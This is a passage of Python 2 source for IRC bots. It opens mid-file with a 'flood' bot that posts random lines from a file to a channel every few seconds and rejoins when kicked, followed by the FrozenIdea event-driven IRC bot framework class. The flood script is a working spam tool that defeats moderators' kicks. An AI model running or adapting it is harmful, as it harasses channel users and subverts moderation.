        self.react_to_anything()

    def on_kick(self, chan_name, who):
        time.sleep(1)
        self.join(self.chan)

    def react_to_anything(self):
        """
        Called when certain events occurs:
            .on_somebody_leaved()
            .on_somebody_joined_chan()
            .on_channel_join()
            .on_channel_message()

        Used as ticker, to be able to send user warning about their TODO list
        after some time.
        """
        if self.join_list[0] not in self.chans:
            print "not joined yet"
            return

        if (time.time() - self._last_flood) > self.pause:
            self.send_msg(self.join_list[0], random.choice(self.flood))
            self._last_flood = time.time()


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='IRC TODObot')
    parser.add_argument(
        "-s",
        '--server',
        type=str,
        help='Address of the IRC server.'
    )
    parser.add_argument(
        "-p",
        '--port',
        type=int,
        default=6667,
        help='Port of the IRC server. Default 6667.'
    )
    parser.add_argument(
        "-n",
        '--nick',
        type=str,
        default="TODObot",
        help="Bot's nick. Default 'TODObot'."
    )
    parser.add_argument(
        'channels',
        metavar='CHANNEL',
        type=str,
        nargs='+',
        help='List of channels for bot to join. With or without #.'
    )
    parser.add_argument(
        "-f",
        '--filename',
        type=str,
        help="Filename of the flood messages."
    )
    parser.add_argument(
        "-t",
        '--time',
        type=int,
        default=3,
        help='Pause between the floods.'
    )
    args = parser.parse_args()

    with open(args.filename) as f:
        flood = f.read().splitlines()

    bot = FloodBot(
        nickname=args.nick,
        chans=args.channels,
        server=args.server,
        port=args.port,
        flood=flood,
        pause=args.time,
    )
    bot.verbose = True

    try:
        bot.run()
    except KeyboardInterrupt:
        print "Clean exit."
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
"""
FrozenIdea event driven IRC bot class
by  Bystroushaak (bystrousak@kitakitsune.org)
and Thyrst (https://github.com/Thyrst)
"""
# Interpreter version: python 2.7
#
# TODO
#   :irc.cyberyard.net 401 TODObot � :No such nick/channel
#   ERROR :Closing Link: TODObot[31.31.73.113] (Excess Flood)
#
# Imports =====================================================================
import time
import socket
import select
import ssl
from collections import namedtuple


# Exceptions ==================================================================
class QuitException(Exception):
    pass


# Datastructures ==============================================================
class ParsedMsg(namedtuple("ParsedMsg", "nick type text")):
    pass


# Class definition ============================================================
class FrozenIdea(object):
    """
    FrozenIdea IRC bot template class.

    This class allows you to write easily event driven IRC bots.

    Attributes:
        nickname (str): Nickname used by the bot
        password (str): Password for irc server (not channel).
        real_name (str): Real name irc property - shown in whois.
        part_msg (str): Message shown when IRC bot is leaving the channel.
        quit_msg (str): Same as `part_msg`, but when quitting.
        chans (str): Dict {"chan_name": [users,]}.
        join_list (list): List of the channel names to which the bot should
            join.
        socket_timeout (int): Timeout for the socket in seconds. Default 60.
        last_ping (float): Timestamp of the last PING message.
        default_ping_diff (int): Time delta between pings. Used for reconnects.
            Default 300s.
        verbose (str): Should the bot print all incomming messages to stdout?
                      default False
        port (int): Port of the server the bot is connected to.
        server (str): Hostname of the server the bot is connected to.
        _socket (obj): Socket object. Don't mess with this.
        ENDL (str): Definition of end of the line sequence.

    Raise :class:`QuitException` if you wish to quit.
    """
    def __init__(
        self, nickname, server, port, join_list=None, lazy=False, _ssl=False):
        """
        Constructor.

        Args:
            nickname (str): Name the bot should use.
            server (str): Address of the server.
            port (int): Port the server uses for IRC.
            join_list (list, default None): List of the channels to which the
                bot should join after connection is established.
            lazy (bool, default False): Should the bot be lazy and not connect
                when the constructor is called?
        """
        self.nickname = nickname
        self.real_name = "FrozenIdea IRC bot"

        self.part_msg = "Fuck it, I quit."
        self.quit_msg = self.part_msg
        self.password = ""
        self.verbose = False

        self.socket_timeout = 60
        self.last_ping = time.time()
        self.default_ping_diff = 60 * 5  # 20m

        self.chans = {}
        self.join_list = join_list or []

        self.server = server
        self.port = port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._endl = "\r\n"
        self._ssl = _ssl

        if self._ssl:
            self._socket = ssl.wrap_socket(self._socket)

        if not lazy:
            self.connect()

    def connect(self):
        """
        Connect socket to server.
        """
        self._socket.connect((self.server, int(self.port)))
        self._socket.setblocking(0)

    def _socket_send_line(self, line):
        """
        Send line thru socket. Adds self._endl if there is not already one.

        Args:
            line (str): Line which will be sent to socket.
        """
        if not line.endswith(self._endl):
            line += self._endl

        # lot of fun with this shit -- if you wan't to enjoy some unicode
        # errors, try sending "��"
        try:
            line = bytes(line)
        except UnicodeEncodeError:
            try:
                line = bytes(line.decode("utf-8"))
            except UnicodeEncodeError:
                line = bytearray(line, "ascii", "ignore")

        self._socket.send(line)

    def join(self, chan):
        """
        Join channel. Adds # before `chan`, if there is not already one.

        Args:
            chan (str): Name of the channel.
        """
        if not chan.startswith("#"):
            chan = "#" + chan

        self._socket_send_line("JOIN " + chan)

    def join_all(self, chans=None):
        """
        Join all `chans`. If the `chans` is ``None``, use
        :attr:`self.join_all`.

        Args:
            chans (list, default None): List of the channels to join.
        """
        if chans is None:
            chans = self.join_list

        for chan in chans:
            if isinstance(chan, basestring):
                self.join(chan)
            elif type(chan) in [tuple, list]:
                for c in chan:
                    self.join(c)

    def rename(self, new_name):
        """
        Change :attr:`self.nickname` to `new_name`.

        Args:
            new_name (str): New nickname.
        """
        if self.nickname != new_name:
            self.nickname = new_name
            self._socket_send_line("NICK " + new_name)

    def send_msg(self, to, msg, msg_type=0):
        """
        Send message to given user or channel.

        Args:
            to (str): User or channel.
            msg (str): Message.
            msg_type (int, default 0): Type of the message. `0` for normal
                     message, `1` for action message or `2` for notice.
        """
        line = [
            "PRIVMSG %s :%s" % (to, msg),
            "PRIVMSG %s :\x01ACTION %s\x01" % (to, msg),
            "NOTICE %s :%s" % (to, msg),
        ]

        try:
            line = line[int(msg_type)]
        except IndexError:
            line = "PRIVMSG " + to + " :" + msg

        self._socket_send_line(line)

    def send_array(self, to, array):
        """
        Send list of messages from `array` to `to`.

        Args:
            to (str): User or channel.
            array (list): List of the messages.
        """
        for line in array:
            self.send_msg(to, line)

    def part(self, chan, msg=None):
        """
        Leave channel `chan`. Show .part_msg if set.

        Args:
            chan (str): Name of the channel.
            msg (str, default None): Optional part message.
        """
        if msg is None:
            msg = self.part_msg

        if self.verbose:
            print "---", chan

        self._socket_send_line("PART " + chan + " :" + str(msg))

    def quit(self):
        """
        Leave all channels and close connection. Show :attr:`self.quit_msg`
        if set.
        """
        self._socket_send_line("QUIT :" + self.quit_msg)
        self._socket.close()

    def run(self):
        """
        Run the ._really_run() method and check it for errors to ensure clean
        quit.
        """
        try:
            self._really_run()

        except KeyboardInterrupt:
            self.on_quit()
            self.quit()
            return

        finally:
            self.on_quit()
            self.quit()
            raise

    def _really_run(self):
        """
        Lowlevel socekt operations.

        Read data from socket, join them into messages, react to pings and so
        on.
        """
        # check server password
        if self.password != "":
            self._socket_send_line("PASS " + self.password)

        # identify to server
        self._socket_send_line(
            "USER " + self.nickname + " 0 0 :" + self.real_name
        )
        self._socket_send_line("NICK " + self.nickname)

        msg_queue = ""
        while True:
            # select read doesn't consume that much resources from server
            ready_to_read, ready_to_write, in_error = select.select(
                [self._socket],
                [],
                [],
                self.socket_timeout
            )

            # timeouted, call .on_select_timeout()
            if not ready_to_read:
                self.on_select_timeout()
                continue

            try:
                # read 4096B from the server
                msg_queue += self._socket.recv(4096)
            except ssl.SSLWantReadError:
                select.select([self._socket], [], [], self.socket_timeout)
                continue

            # whole message doesn't arrived yet
            if self._endl not in msg_queue:
                continue

            # get arrived messages
            splitted = msg_queue.split(self._endl)
            msgs = splitted[:-1]  # all fully parsed messages
            msg_queue = splitted[-1]  # last one may not be whole

            for msg in msgs:
                msg = bytes(msg)
                if self.verbose:
                    print msg.strip()

                if msg.startswith("PING"):  # react o ping
                    ping_val = msg.split()[1].strip()
                    self._socket_send_line("PONG " + ping_val)
                    self.on_ping(ping_val)
                    self.last_ping = time.time()
                    continue

                try:
                    self._logic(msg)
                except QuitException:
                    self.on_quit()
                    self.quit()
                    return

    def _parse_msg(self, msg):
        """
        Get from who is the `msg`, which type it is and it's body.

        Args:
            msg (str): Message obtained from the server.

        Returns:
            obj: :class:`ParsedMsg` instance.
        """
        msg = msg[1:]  # remove : from the beggining

        nickname, msg = msg.split(" ", 1)
        if ":" in msg:
            msg_type, msg = msg.split(":", 1)
        else:
            msg_type = msg.strip()
            msg = ""

        return ParsedMsg(
            nick=nickname.strip(),
            type=msg_type.strip(),
            text=msg.strip(),
        )

    def _logic(self, msg):
        """
        React to `msg`. This is what calls event callbacks.

        Args:
            msg (str): Message from the server.
        """
        parsed = self._parse_msg(msg)

        # end of motd
        if parsed.type.startswith("376"):
            self.on_server_connected()

        # end of motd
        elif parsed.type.startswith("422"):
            self.on_server_connected()

        # nickname already in use
        elif parsed.type.startswith("433"):
            nickname = parsed.type.split(" ", 2)[1]
            self.on_nickname_used(nickname)

        # nick list
        elif parsed.type.startswith("353"):
            chan_name = "#" + parsed.type.split("#")[-1].strip()

            new_chan = True
            if chan_name in self.chans:
                del self.chans[chan_name]
                new_chan = False

            # get list of nicks, remove chan statuses (op/halfop/..)
            msg = map(
                lambda nick: nick if nick[0] not in "&@%+" else nick[1:],
                parsed.text.split()
            )

            self.chans[chan_name] = msg

            if new_chan:
                self.on_joined_to_chan(chan_name)

        # PM or chan message
        elif parsed.type.startswith("PRIVMSG"):
            nick, hostname = parsed.nick.split("!", 1)

            if nick == self.nickname:
                return

            # channel message
            if "#" in parsed.type:
                msg_type = parsed.type.split()[-1]

                if parsed.text.startswith("\x01ACTION"):
                    msg = parsed.text.split("\x01ACTION", 1)[1]
                    msg = msg.strip().strip("\x01")
                    self.on_channel_action_message(
                        msg_type,
                        nick,
                        hostname,
                        msg
                    )
                    return

                self.on_channel_message(
                    msg_type,
                    nick,
                    hostname,
                    parsed.text
                )
                return

            # pm msg
            if not parsed.text.startswith("\x01ACTION"):
                self.on_private_message(nick, hostname, parsed.text)
                return

            # pm action message
            msg = parsed.text.split("\x01ACTION", 1)[1].strip().strip("\x01")
            self.on_private_action_message(nick, hostname, msg)

        # kicked from chan
        elif parsed.type.startswith("404") or parsed.type.startswith("KICK"):
            msg_type = parsed.type.split()
            chan_name = msg_type[1]
            who = msg_type[2]
            msg = parsed.text.split(":")[0]  # TODO: parse kick message

            if who == self.nickname:
                self.on_kick(chan_name, msg)
                del self.chans[chan_name]
            else:
                if msg in self.chans[chan_name]:
                    self.chans[chan_name].remove(msg)
                self.on_somebody_kicked(chan_name, who, msg)

        # somebody joined channel
        elif parsed.type.startswith("JOIN"):
            nick = parsed.nick.split("!")[0].strip()
            try:
                chan_name = parsed.type.split()[1].strip()
            except IndexError:
                chan_name = parsed.text

            if nick != self.nickname:
                if nick not in self.chans[chan_name]:
                    self.chans[chan_name].append(nick)
                    self.on_somebody_joined_chan(chan_name, nick)

        # user renamed
        elif parsed.type == "NICK":
            old_nick = parsed.nick.split("!")[0].strip()

            for chan in self.chans.keys():
                if old_nick in self.chans[chan]:
                    self.chans[chan].remove(old_nick)
                    self.chans[chan].append(parsed.text)

            self.on_user_renamed(old_nick, parsed.text)

        # user leaved the channel
        elif parsed.type.startswith("PART"):
            chan = parsed.type.split()[-1]
            nick = parsed.nick.split("!")[0].strip()

            if nick in self.chans[chan]:
                self.chans[chan].remove(nick)

            self.on_somebody_leaved(chan, nick)

        # user quit the server
        elif parsed.type.startswith("QUIT"):
            nick = parsed.nick.split("!")[0].strip()

            for chan in self.chans.keys():
                if nick in self.chans[chan]:
                    self.chans[chan].remove(nick)

            self.on_somebody_quit(nick)

    def on_nickname_used(self, nickname):
        """
        Callback when `nickname` is already in use.

        Args:
            nickname (str): Used nickname.
        """
        self.rename(nickname + "_")

    def on_server_connected(self):
        """
        Called when bot is successfully connected to the server.

        By default, the +B mode is set to the bot and then bot joins all
        channels defined in :attr:`self.join_list`.
        """
        self._socket_send_line("MODE " + self.nickname + " +B")
        self.join_all()

    def on_joined_to_chan(self, chan):
        """
        Called when the bot has successfully joined the channel.

        Args:
            chan (str): Name fo the channel the bot just joined.
        """
        pass

    def on_somebody_joined_chan(self, chan, who):
        """
        Called when somebody joined the channel you are in.

        Args:
            chan (str): Name fo the channel where the new user arrived.
            who (str): Name of the user who just joined.
        """
        pass

    def on_channel_message(self, chan, who, hostname, msg):
        """
        Called when somebody posted message to a channel you are in.

        Args:
            chan (str): Name of the channel (starts with #).
            who (str): Name of the origin of the message.
            hostname (str): User's hostname - IP address usually.
            msg (str): User's message.
        """
        pass

    def on_private_message(self, who, hostname, msg):
        """
        Called when somebody send you private message.

        Args:
            who (str): Name of the origin of the message.
            hostname (str): User's hostname - IP address usually.
            msg (str): User's message.
        """
        pass

    def on_channel_action_message(self, chan, who, hostname, msg):
        """
        Called for channel message with action.

        Args:
            chan (str): Name of the channel (starts with #) where the
                event occured.
            who (str): Name of the origin of the message.
            hostname (str): User's hostname - IP address usually.
            msg (str): User's message.
        """
        pass

    def on_private_action_message(self, who, hostname, msg):
        """
        Called for private message with action.

        Args:
            who (str): Name of the origin of the message.
            hostname (str): User's hostname - IP address usually.
            msg (str): User's message.
        """
        pass

    def on_user_renamed(self, old_nick, new_nick):
        """
        Called when user renamed himself.

        See :attr:`.chans` property, where user nicknames are tracked and
        stored.

        Args:
            old_nick (str): Old nick used by user.
            new_nick (str): Nick into which user just renamed itself.
        """
        pass

    def on_kick(self, chan, who):
        """
        Called when somebody kicks you from the channel.

        Args:
            chan (str): Name of the channel (starts with #) where the
                event occured.
            who (str): Nickname of the user who just kicked the bot.
        """
        time.sleep(5)
        self.join(chan)

    def on_somebody_kicked(self, chan, who, kicked_user):
        """
        Called when somebody kick someone from `chan`.

        Args:
            chan (str): Name of the channel (starts with #) where the
                event occured.
            who (str): Nickname of the user who kicked `kicked_user`.
            kicked_user (str): Nickname of the user who was kicked from chan.
        """
        pass

    def on_somebody_leaved(self, chan, who):
        """
        Called when somebody leaved the channel.

        Args:
            chan (str): Name of the channel (starts with #) where the
                event occured.
            who (str): Nickname of the user who just leaved.
        """
        pass

    def on_somebody_quit(self, who):
        """
        Called when somebody leaves the server.

        Args:
            who (str): Nickname of the user who just leaved.
        """
        pass

    def on_select_timeout(self):
        """
        Called every :attr:`self.socket_timeout` seconds if nothing else is
        happening on the socket.

        This can be usefull source of event ticks.

        PS: Ping from server IS considered as something.
        """
        pass

    def on_ping(self, ping_val):
        """
        Called when the server sends PING to the bot. PONG is automatically
        sent back.

        By default, keep track of the :attr:`self.last_ping` and reconnect, if
        the diff is bigger than :attr:`self.default_ping_diff`.

        Attr:
            ping_val (str): Value of the ping message sent from the server.

        See:
            self.last_ping for the timestamp of the last ping.
            self.default_ping_diff for the time considered to be normal ping
                distance.
        """
        now = time.time()

        if now - self.last_ping >= self.default_ping_diff:
            self.quit()
            self.connect()

    def on_quit(self):
        """
        Called when the bot is quitiing the server. Here should be your code
        which takes care of everything you need to do.
        """
        pass
